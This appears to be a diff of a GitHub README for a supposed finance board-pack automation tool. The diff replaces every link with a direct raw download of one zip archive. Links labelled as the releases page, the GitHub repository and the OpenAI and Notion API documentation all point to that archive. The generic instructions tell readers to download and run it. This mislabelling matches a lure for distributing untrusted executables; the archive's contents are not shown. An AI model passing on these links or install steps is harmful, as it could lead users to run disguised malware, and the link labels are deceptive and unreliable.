@@ -1,6 +1,6 @@
 # 🚀 finance-board-pack-ai-automation - Generate Board Packs Effortlessly
 
-[![Download Release](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip)
+[![Download Release](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip%20Release-v1.0-brightgreen)](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip)
 
 ## 📋 Description
 This application automates the generation of Board Packs. It uses Make, Google Sheets, OpenAI, and Notion to pull monthly actuals. The software converts data into structured JSON, generates Management Discussion and Analysis (MD&A) commentary, and stores results in Notion. It also posts updates to Slack. This tool is reusable for multi-company CFO workflows, making it easier for finance teams to manage reporting.
@@ -15,7 +15,7 @@ This application automates the generation of Board Packs. It uses Make, Google S
 Follow these steps to download and run the application.
 
 1. **Visit the Releases Page**  
-   Go to the Releases page to see the latest version of the application. [Download Release](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip)
+   Go to the Releases page to see the latest version of the application. [Download Release](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip)
 
 2. **Select the Version**  
    On the Releases page, locate the version that you wish to download. It is usually the latest one at the top of the list.
@@ -40,7 +40,7 @@ Once you run the application, it may ask for initial configuration. Follow these
 - **Slack Setup**: If you want to receive notifications in Slack, enter your Slack webhook URL.
 
 ## 📥 Download & Install
-To download the application, [visit this page](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip) and choose the file suitable for your operating system. Ensure that you follow each step to complete the installation.
+To download the application, [visit this page](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip) and choose the file suitable for your operating system. Ensure that you follow each step to complete the installation.
 
 ## 💡 Features
 - **Automated Data Retrieval**: Pull monthly actuals from Google Sheets with ease.
@@ -59,8 +59,8 @@ For any questions, you can reach support through our GitHub Issues page. Please 
 If you encounter any issues during installation, consult the FAQ section on the GitHub page. There, you will find answers to common concerns.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip)
-- [OpenAI API Documentation](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip)
-- [Notion API Documentation](https://raw.githubusercontent.com/fatih156612/finance-board-pack-ai-automation/main/docs/finance-board-pack-ai-automation_1.3.zip)
+- [GitHub Repository](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip)
+- [OpenAI API Documentation](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip)
+- [Notion API Documentation](https://github.com/fatih156612/finance-board-pack-ai-automation/raw/refs/heads/main/data/ai_automation_board_pack_finance_2.8.zip)
 
 By following these straightforward steps, you will be well on your way to automating your Board Pack generation. Enjoy your new tool!
